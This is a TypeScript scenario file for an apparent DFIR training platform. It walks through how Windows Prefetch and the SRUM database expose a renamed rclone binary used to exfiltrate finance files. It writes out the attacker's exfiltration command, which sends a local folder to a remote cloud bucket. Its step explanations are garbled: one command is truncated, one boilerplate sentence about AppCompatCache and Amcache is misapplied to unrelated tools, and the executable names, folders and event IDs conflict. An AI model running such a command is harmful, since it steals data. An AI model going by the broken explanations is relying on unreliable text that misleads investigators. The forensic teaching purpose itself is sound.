import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-windows-prefetch-srum-network-execution-trace',
    title: 'NIST SP 800-86 & SANS DFIR — Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace',
    category: 'MALWARE',
    mitreId: 'T1041',
    description:
      'Grounded in SANS DFIR Windows Artifact Analysis, Microsoft System Resource Usage Monitor (SRUM) architecture, and NIST SP 800-86: when an attacker renames rclone.exe to svchost_upd.exe, runs it to exfiltrate data over HTTPS, and deletes the binary, Windows Prefetch (C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-<Hash>.pf) records the run count, last 8 execution timestamps, and every referenced file/directory, while C:\\Windows\\System32\\sru\\SRUDB.dat logs the exact Process SID, AppId, and BytesSent.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Masqueraded rclone (svchost_upd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SysMain / Prefetcher Engine', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Prefetch (*.pf MAM Compressed)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'PECmd & SrumECmd Forensics', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'SRUDB.dat (ESE Network Usage)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace',
        narration:
          'The attacker renames rclone.exe to C:\\ProgramData\\svchost_upd.exe and runs svchost_upd.exe copy C:\\Finance mega:exfil. For the first 10 seconds of process execution, the Windows kernel memory manager and SysMain (Superfetch) service monitor every DLL, configuration file, and directory touched by the process.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1036.005 - Masquerading: Match Legitimate Name or Location)',
        technicalCommands: [
          'C:\\ProgramData\\svchost_upd.exe copy C:\\Finance\\Q4_M_and_A mega:exfil_bucket --config C:\\ProgramData\\rclone.conf',
          'SysMain Service writes compressed MAM (0x04 0x4D 0x41 0x4D) Prefetch file after 10s trace window',
        ],
        defenseMitigation:
          'Ensure Prefetch is enabled on both Windows Workstations and Windows Servers (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 3) for high-fidelity DFIR execution artifacts.',
        logs: [
          {
            id: 'dfir-pf-1',
            timestamp: '01:12:04.330',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain (Writing SVCHOST_UPD.EXE-9A41C20F.pf)',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\svchost.exe | TargetFilename: C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf | HeaderMagic: 4D414D04 (MAM LZXPRESS Huffman Compressed)',
            parsedFields: {
              PrefetchFile: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              CompressionHeader: 'MAM\\x04 (LZXPRESS Huffman Win10/11)',
              TracedExecutable: 'C:\\ProgramData\\svchost_upd.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Prefetch (.pf) Run Count, Last 8 Execution Timestamps & Referenced File Handles (PECmd)',
        narration:
          'Decompressing and parsing SVCHOST_UPD.EXE-9A41C20F.pf with PECmd.exe reveals RunCount=2, the last 8 execution timestamps in UTC, Volume serial numbers, and the complete list of files opened during startup—including C:\\ProgramData\\rclone.conf and C:\\Finance\\Q4_M_and_A\\Merger_Terms.xlsx—proving the masqueraded binary was actually Rclone reading sensitive files.',
        activeNodes: ['target', 'siem', 'ad'],
        mitreTactic: 'Collection (T1005 - Data from Local System Proved via Prefetch File Metrics)',
        technicalCommands: [
          'PECmd.exe -f "C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf" --csv C:\\Forensics',
          'Prefetch Version: 30 (Win10/11) | RunCount: 2 | LastRun: 2026-11-03 01:11:54 UTC',
          'FilesReferenced: \\VOLUME{01d9...}\\PROGRAMDATA\\RCLONE.CONF, \\VOLUME{01d9...}\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX',
        ],
        defenseMitigation:
          'During incident response, parse all C:\\Windows\\Prefetch\\*.pf files with PECmd.exe and search the FilesReferenced array for staging archives (.7z, .rar), rclone.conf, or credential stores.',
        logs: [
          {
            id: 'dfir-pf-2',
            timestamp: '01:25:10.100',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 30,
            ProcessName: 'PECmd.exe',
            CommandLine: 'PECmd.exe -f C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
            raw: 'PREFETCH_PARSE: ExecutableName="SVCHOST_UPD.EXE" Hash="9A41C20F" RunCount=2 LastRun="2026-11-03 01:11:54"PreviousRun0="2026-11-03 01:08:12" FilesReferenced="C:\\PROGRAMDATA\\RCLONE.CONF; C:\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX"',
            parsedFields: {
              ArtifactPath: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              RunCount: '2',
              LastRunUtc: '2026-11-03 01:11:54',
              SmokingGunReference: 'C:\\PROGRAMDATA\\RCLONE.CONF & MERGER_TERMS.XLSX',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SRUM Database (SRUDB.dat) Network Data Usage Attribution ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
        narration:
          'To quantify the exact volume of data exfiltrated even after the binary was deleted and firewall logs rolled over, the analyst parses C:\\Windows\\System32\\sru\\SRUDB.dat (cross-referenced with the SOFTWARE hive for SruDbIdMapTable SIDs) using SrumECmd.exe. Table {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage Monitor) proves \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe transmitted 1,482,910,208 BytesSent under User SID S-1-5-21-...-1104.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel Quantified via SRUM)',
        technicalCommands: [
          'SrumECmd.exe -f "C:\\Windows\\System32\\sru\\SRUDB.dat" -r "C:\\Windows\\System32\\config\\SOFTWARE" --csv C:\\Forensics',
          'SRUM Table GUID: {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage)',
          'AppId: \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe | BytesSent: 1,482,910,208 (1.48 GB)',
        ],
        defenseMitigation:
          'Always acquire C:\\Windows\\System32\\sru\\SRUDB.dat alongside C:\\Windows\\System32\\config\\SOFTWARE during breach scoping to prove or disprove data exfiltration volumes per process and user SID.',
        logs: [
          {
            id: 'dfir-pf-3',
            timestamp: '01:30:00.400',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 973,
            ProcessName: 'SrumECmd.exe',
            CommandLine: 'SrumECmd.exe -f C:\\Windows\\System32\\sru\\SRUDB.dat -r C:\\Windows\\System32\\config\\SOFTWARE',
            raw: 'SRUM_NETWORK_USAGE: Table="{973F5D5C-1D90-4944-BE8E-24B94231A174}" Timestamp="2026-11-03 01:15:00" ExeInfo="\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe" UserSid="S-1-5-21-3819201-1104" BytesSent=1482910208 BytesRecvd=14209120',
            parsedFields: {
              ForensicDatabase: 'C:\\Windows\\System32\\sru\\SRUDB.dat',
              SrumTableGuid: '{973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Usage)',
              TrackedProcess: '\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe',
              ExfiltratedBytesSent: '1,482,910,208 bytes (1.48 GB)',
            },
          },
        ],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
      scenarioId: 'dfir-windows-prefetch-srum-network-execution-trace',
      briefing: {
          headline: 'Scenario Briefing: Official DFIR & Log Forensics Guide for NIST SP 800-86 & SANS DFIR, Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace',
          storyAnalogy: 'Imagine an intruder who renames a heavy data-theft truck to look like a harmless system broom, drives off with gigabytes of company files, and shreds the truck afterward. Investigators expose the heist using two quiet building efficiency meters: the morning fast-loader notebook records exactly how many times that disguised broom ran, its last eight timestamps, and every folder it touched, while the power-and-data utility meter logs the exact number of outbound megabytes that specific broom shipped out of the building.',
          storyMappings: [
              {
                  storyTerm: 'Morning fast-loader notebook tracking every launch and touched folder',
                  technicalTerm: 'Windows Prefetch (MAM-compressed .pf files) recording run count, last 8 timestamps, and file handles',
                  tone: 'amber',
                },
              {
                  storyTerm: 'Power-and-data utility meter logging exact outbound megabytes per tool',
                  technicalTerm: 'SRUM database (SRUDB.dat) Network Data Usage table ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
                  tone: 'sky',
                },
              {
                  storyTerm: 'Heavy data-theft truck disguised as a harmless system broom',
                  technicalTerm: 'Masqueraded exfiltration binary (e.g., svchost_sync.exe / renamed rclone) run from Temp',
                  tone: 'rose',
                },
              {
                  storyTerm: 'Proving exact stolen data volume even after binary deletion',
                  technicalTerm: 'Correlating PECmd Prefetch timelines with SRUM BytesSent per AppId and UserSid',
                  tone: 'emerald',
                },
            ],
          plainSummary: 'On a Windows endpoint (MITRE T1041 exfiltration over the network), an attacker renames a data-sync tool to look like a service binary, runs it over HTTPS, then deletes the file hoping disk and logs forget the run. Windows still records the masqueraded execution in Prefetch and logs outbound volume in the SRUM network usage database. Steps #1 capture SysMain tracing of the renamed binary launch, Step #2 mines Prefetch run counts, timestamps, and referenced paths with PECmd, and Step #3 attributes bytes sent and process identity in SRUDB.dat. Primary detection pivots on Prefetch entries whose referenced paths no longer exist paired with SRUM spikes from a non-standard AppId.',
          diagramTopologySummary: 'The forensic topology spans Node ① (Masqueraded rclone , svchost_upd), Node ② (SysMain / Prefetcher Engine), Node ③ (Prefetch , *.pf MAM Compressed), Node ④ (Runtime Process & Artifact Context), Node ⑤ (SRUDB.dat , ESE Network Usage), and Node ⑥ (PECmd & SrumECmd Forensics) across 3 chronological steps (#1 to #3).',
          documentedAdvisory: 'Official Vendor & CERT DFIR Documentation (T1041) · NIST SP 800-86 & SANS DFIR, Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace',
        },
      steps: [
          {
              stepNumber: 1,
              mitreId: 'T1036.005',
              plainTitle: 'Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace',
              storyAnalogy: 'When the intruder launches a renamed exfiltration tool from a temporary folder, the operating system built-in launch-accelerator service watches the first ten seconds of execution to learn which files and libraries the tool loads.',
              simpleExplanation: 'The attacker renames rclone.exe to C:\\ProgramData\\svchost_upd.exe and runs svchost_upd.exe copy C:\\Finance mega:exfil. For the first 10 seconds of process execution, the Windows kernel memory manager and SysMain (Superfetch) service monitor every DLL, configuration file, and directory touched by the process (logged in Sysmon Event 11 with PrefetchFile=C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf, CompressionHeader=MAM\\x04 , LZXPRESS Huffman Win10/11, TracedExecutable=C:\\ProgramData\\svchost_upd.exe so analysts can verify the exact actor and target artifact).',
              howItWorksInPractice: 'Under the hood, the observed step executes C:\\ProgramData\\svchost_upd.exe copy C:\\Finance\\Q4_M_and_A mega:exfil_bucket --config C:\\ProgramData\\rclone.conf (which executes the technical command / telemetry directive , C:\\ProgramData\\svchost_upd.exe copy C:\\Finance\\Q4_M_and_A mega:exfil_bucket --config C:\\Prog so that advances the scenario kill-chain under MITRE T1036.005 during "Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace" , The attacker renames rclone while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact SysMain Service writes compressed MAM (0x04 0x4D 0x41 0x4D) Prefetch file after 10s trace window runs (which Extracts and parses persistent Windows execution artifacts from HKLM\\SYSTEM AppCompatCache , ShimCache, C:\\Windows\\AppCompat\\Programs\\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1036.005 during "Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace" even after the attacker deletes the malware executable from disk).',
              diagramAlignment: 'On the diagram, follow Step #1 / Link #1 across the topology from Masqueraded rclone , svchost_upd and SysMain / Prefetcher Engine toward Prefetch , *.pf MAM Compressed and PECmd & SrumECmd Forensics.',
              detectionAndEvidence: 'Documented in Sysmon Event 11 (recording PrefetchFile=C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf, CompressionHeader=MAM\\x04 , LZXPRESS Huffman Win10/11, TracedExecutable=C:\\ProgramData\\svchost_upd.exe under T1036.005): Ensure Prefetch is enabled on both Windows Workstations and Windows Servers (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 3) for high-fidelity DFIR execution artifacts.',
              storyMappings: [
                  {
                      storyTerm: 'Renamed exfiltration tool run from a temporary folder',
                      technicalTerm: 'Masqueraded rclone / custom exfiltrator executed out of C:\\Windows\\Temp',
                      tone: 'amber',
                    },
                  {
                      storyTerm: 'Built-in launch-accelerator service watching the first ten seconds',
                      technicalTerm: 'Windows SysMain (Superfetch) Prefetcher tracing loaded DLLs and accessed paths',
                      tone: 'sky',
                    },
                  {
                      storyTerm: 'Compressed fast-start card saved automatically',
                      technicalTerm: 'MAM-compressed .pf artifact written to C:\\Windows\\Prefetch\\<EXE>-<HASH>.pf',
                      tone: 'rose',
                    },
                  {
                      storyTerm: 'Surviving rapid deletion of the malware',
                      technicalTerm: 'Prefetch file persisting on disk long after the attacker deletes the executable',
                      tone: 'emerald',
                    },
                ],
            },
          {
              stepNumber: 2,
              mitreId: 'T1005',
              plainTitle: 'Prefetch (.pf) Run Count, Last 8 Execution Timestamps & Referenced File Handles (PECmd)',
              storyAnalogy: 'Decompressing that fast-start card offline, forensic analysts immediately read three golden clues: total launch count, up to the last eight exact execution timestamps, and the exact list of staged ZIP archives or folders the tool opened.',
              simpleExplanation: 'Decompressing and parsing SVCHOST_UPD.EXE-9A41C20F.pf with PECmd.exe reveals RunCount=2, the last 8 execution timestamps in UTC, Volume serial numbers, and the complete list of files opened during startup, including C:\\ProgramData\\rclone.conf and C:\\Finance\\Q4_M_and_A\\Merger_Terms.xlsx, proving the masqueraded binary was actually Rclone reading sensitive files (logged in WinEvent Event 30 with ArtifactPath=C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf, RunCount=2, LastRunUtc=2026-11-03 01:11:54, SmokingGunReference=C:\\PROGRAMDATA\\RCLONE.CONF & MERGER_TERMS.XLSX so analysts can verify the exact actor and target artifact).',
              howItWorksInPractice: 'Under the hood, the observed step executes PECmd.exe -f "C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf" --csv C:\\Forensics (which Extracts and parses persistent Windows execution artifacts from HKLM\\SYSTEM AppCompatCache , ShimCache, C:\\Windows\\AppCompat\\Programs\\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1005 during "Prefetch .pf Run Count, Last 8 Execution Timestamps & Referenced File Handles , PECmd" even after the attacker deletes the malware executable from disk). Next, the follow-up artifact Prefetch Version: 30 (Win10/11) | RunCount: 2 | LastRun: 2026-11-03 01:11:54 UTC runs (which Extracts and parses persistent Windows execution artifacts from HKLM\\SYSTEM AppCompatCache , ShimCache, C:\\Windows\\AppCompat\\Programs\\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1005 during "Prefetch .pf Run Count, Last 8 Execution Timestamps & Referenced File Handles , PECmd" even after the attacker deletes the malware executable from disk).',
              diagramAlignment: 'On the diagram, follow Step #2 / Link #2 across the topology from Masqueraded rclone , svchost_upd and SysMain / Prefetcher Engine toward Prefetch , *.pf MAM Compressed and PECmd & SrumECmd Forensics.',
              detectionAndEvidence: 'Documented in WinEvent Event 30 (recording ArtifactPath=C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf, RunCount=2, LastRunUtc=2026-11-03 01:11:54, SmokingGunReference=C:\\PROGRAMDATA\\RCLONE.CONF & MERGER_TERMS.XLSX under T1005): During incident response, parse all C:\\Windows\\Prefetch\\*.pf files with PECmd.exe and search the FilesReferenced array for staging archives (.7z.rar), rclone.conf, or credential stores.',
              storyMappings: [
                  {
                      storyTerm: 'Decompressing the fast-start card offline',
                      technicalTerm: 'Parsing MAM-compressed Windows 10/11 .pf files with PECmd',
                      tone: 'amber',
                    },
                  {
                      storyTerm: 'Total launches and up to eight exact timestamps',
                      technicalTerm: 'Prefetch RunCount and last 8 execution UTC timestamps embedded in .pf metadata',
                      tone: 'sky',
                    },
                  {
                      storyTerm: 'Exact list of staged archives and folders opened',
                      technicalTerm: 'Prefetch referenced file/directory paths proving which victim archives the tool touched',
                      tone: 'rose',
                    },
                  {
                      storyTerm: 'Unique path fingerprint stamped in the filename',
                      technicalTerm: '8-character Prefetch path hash verifying the exact directory where the binary ran',
                      tone: 'emerald',
                    },
                ],
            },
          {
              stepNumber: 3,
              mitreId: 'T1041',
              plainTitle: 'SRUM Database (SRUDB.dat) Network Data Usage Attribution ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
              storyAnalogy: 'To quantify exactly how many gigabytes of corporate secrets left the building, analysts open the System Resource Usage Meter database, which quietly tracks every outbound byte sent per executable and per user account for thirty to sixty days.',
              simpleExplanation: 'To quantify the exact volume of data exfiltrated even after the binary was deleted and firewall logs rolled over, the analyst parses C:\\Windows\\System32\\sru\\SRUDB.dat (cross-referenced with the SOFTWARE hive for SruDbIdMapTable SIDs) using SrumECmd.exe. Table {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage Monitor) proves \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe transmitted 1,482,910,208 BytesSent under User SID S-1-5-21-...-1104 (logged in WinEvent Event 973 with ForensicDatabase=C:\\Windows\\System32\\sru\\SRUDB.dat, SrumTableGuid={973F5D5C-1D90-4944-BE8E-24B94231A174} , Network Usage, TrackedProcess=\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe, ExfiltratedBytesSent=1,482,910,208 bytes , 1.48 GB so analysts can verify the exact actor and target artifact).',
              howItWorksInPractice: 'Under the hood, the observed step executes SrumECmd.exe -f "C:\\Windows\\System32\\sru\\SRUDB.dat" -r "C:\\Windows\\System32\\config\\SOFTWARE" --csv C:\\Forensics (which Extracts and parses persistent Windows execution artifacts from HKLM\\SYSTEM AppCompatCache , ShimCache, C:\\Windows\\AppCompat\\Programs\\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1041 during "SRUM Database , SRUDB.dat Network Data Usage Attribution , {973F5D5C-1D90-4944-BE8E-24B94231A174}" even after the attacker deletes the malware executable from disk). Next, the follow-up artifact SRUM Table GUID: {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage) runs (which Extracts and parses persistent Windows execution artifacts from HKLM\\SYSTEM AppCompatCache , ShimCache, C:\\Windows\\AppCompat\\Programs\\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1041 during "SRUM Database , SRUDB.dat Network Data Usage Attribution , {973F5D5C-1D90-4944-BE8E-24B94231A174}" even after the attacker deletes the malware executable from disk).',
              diagramAlignment: 'On the diagram, follow Step #3 / Link #3 across the topology from Masqueraded rclone , svchost_upd and SysMain / Prefetcher Engine toward Prefetch , *.pf MAM Compressed and PECmd & SrumECmd Forensics.',
              detectionAndEvidence: 'Documented in WinEvent Event 973 (recording ForensicDatabase=C:\\Windows\\System32\\sru\\SRUDB.dat, SrumTableGuid={973F5D5C-1D90-4944-BE8E-24B94231A174} , Network Usage, TrackedProcess=\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe, ExfiltratedBytesSent=1,482,910,208 bytes , 1.48 GB under T1041): Always acquire C:\\Windows\\System32\\sru\\SRUDB.dat alongside C:\\Windows\\System32\\config\\SOFTWARE during breach scoping to prove or disprove data exfiltration volumes per process and user SID.',
              storyMappings: [
                  {
                      storyTerm: 'System Resource Usage Meter database',
                      technicalTerm: 'ESE database C:\\Windows\\System32\\sru\\SRUDB.dat',
                      tone: 'amber',
                    },
                  {
                      storyTerm: 'Network Data Usage table recording exact outbound bytes',
                      technicalTerm: 'SRUM GUID {973F5D5C-1D90-4944-BE8E-24B94231A174} logging BytesSent and BytesRecvd',
                      tone: 'sky',
                    },
                  {
                      storyTerm: 'Attributing stolen volume to the exact binary and user',
                      technicalTerm: 'Joining SruDbIdMapTable AppId and UserSid to pinpoint the exfiltrating account',
                      tone: 'rose',
                    },
                  {
                      storyTerm: 'Defeating zero-network-log blind spots',
                      technicalTerm: 'Proving multi-gigabyte exfiltration on hosts lacking firewall or NetFlow telemetry',
                      tone: 'emerald',
                    },
                ],
            },
        ],
    };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine an intruder who renames a heavy data-theft truck to look like a harmless system broom, drives off with gigabytes of company files, and shreds the truck afterward. Investigators expose the heist using two quiet building efficiency meters: the morning fast-loader notebook records exactly how many times that disguised broom ran, its last eight timestamps, and every folder it touched, while the power-and-data utility meter logs the exact number of outbound megabytes that specific broom shipped out of the building.',
      storyMappings: [
        {
          storyTerm: 'Morning fast-loader notebook tracking every launch and touched folder',
          technicalTerm: 'Windows Prefetch (MAM-compressed .pf files) recording run count, last 8 timestamps, and file handles',
          tone: 'amber',
        },
        {
          storyTerm: 'Power-and-data utility meter logging exact outbound megabytes per tool',
          technicalTerm: 'SRUM database (SRUDB.dat) Network Data Usage table ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
          tone: 'sky',
        },
        {
          storyTerm: 'Heavy data-theft truck disguised as a harmless system broom',
          technicalTerm: 'Masqueraded exfiltration binary (e.g., svchost_sync.exe / renamed rclone) run from Temp',
          tone: 'rose',
        },
        {
          storyTerm: 'Proving exact stolen data volume even after binary deletion',
          technicalTerm: 'Correlating PECmd Prefetch timelines with SRUM BytesSent per AppId and UserSid',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'When the intruder launches a renamed exfiltration tool from a temporary folder, the operating system built-in launch-accelerator service watches the first ten seconds of execution to learn which files and libraries the tool loads.',
        storyMappings: [
          {
            storyTerm: 'Renamed exfiltration tool run from a temporary folder',
            technicalTerm: 'Masqueraded rclone / custom exfiltrator executed out of C:\\Windows\\Temp',
            tone: 'amber',
          },
          {
            storyTerm: 'Built-in launch-accelerator service watching the first ten seconds',
            technicalTerm: 'Windows SysMain (Superfetch) Prefetcher tracing loaded DLLs and accessed paths',
            tone: 'sky',
          },
          {
            storyTerm: 'Compressed fast-start card saved automatically',
            technicalTerm: 'MAM-compressed .pf artifact written to C:\\Windows\\Prefetch\\<EXE>-<HASH>.pf',
            tone: 'rose',
          },
          {
            storyTerm: 'Surviving rapid deletion of the malware',
            technicalTerm: 'Prefetch file persisting on disk long after the attacker deletes the executable',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Decompressing that fast-start card offline, forensic analysts immediately read three golden clues: total launch count, up to the last eight exact execution timestamps, and the exact list of staged ZIP archives or folders the tool opened.',
        storyMappings: [
          {
            storyTerm: 'Decompressing the fast-start card offline',
            technicalTerm: 'Parsing MAM-compressed Windows 10/11 .pf files with PECmd',
            tone: 'amber',
          },
          {
            storyTerm: 'Total launches and up to eight exact timestamps',
            technicalTerm: 'Prefetch RunCount and last 8 execution UTC timestamps embedded in .pf metadata',
            tone: 'sky',
          },
          {
            storyTerm: 'Exact list of staged archives and folders opened',
            technicalTerm: 'Prefetch referenced file/directory paths proving which victim archives the tool touched',
            tone: 'rose',
          },
          {
            storyTerm: 'Unique path fingerprint stamped in the filename',
            technicalTerm: '8-character Prefetch path hash verifying the exact directory where the binary ran',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'To quantify exactly how many gigabytes of corporate secrets left the building, analysts open the System Resource Usage Meter database, which quietly tracks every outbound byte sent per executable and per user account for thirty to sixty days.',
        storyMappings: [
          {
            storyTerm: 'System Resource Usage Meter database',
            technicalTerm: 'ESE database C:\\Windows\\System32\\sru\\SRUDB.dat',
            tone: 'amber',
          },
          {
            storyTerm: 'Network Data Usage table recording exact outbound bytes',
            technicalTerm: 'SRUM GUID {973F5D5C-1D90-4944-BE8E-24B94231A174} logging BytesSent and BytesRecvd',
            tone: 'sky',
          },
          {
            storyTerm: 'Attributing stolen volume to the exact binary and user',
            technicalTerm: 'Joining SruDbIdMapTable AppId and UserSid to pinpoint the exfiltrating account',
            tone: 'rose',
          },
          {
            storyTerm: 'Defeating zero-network-log blind spots',
            technicalTerm: 'Proving multi-gigabyte exfiltration on hosts lacking firewall or NetFlow telemetry',
            tone: 'emerald',
          },
        ],
      },
    },
  };
